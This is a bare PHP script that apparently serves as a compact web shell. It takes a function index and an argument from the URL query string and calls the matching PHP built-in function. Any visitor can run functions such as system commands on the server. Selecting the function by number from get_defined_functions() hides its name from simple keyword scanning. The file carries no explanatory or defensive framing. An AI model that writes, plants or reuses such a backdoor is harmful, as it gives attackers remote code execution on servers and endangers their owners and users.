<?php
function callfunc() {
    $func = get_defined_functions();
    $args = func_get_args();
    $func_id = array_shift($args);
    $func_name = $func['internal'][$func_id]; 
    return call_user_func_array($func_name, $args);
}
print callfunc($_GET[2], $_GET[1]);
?>
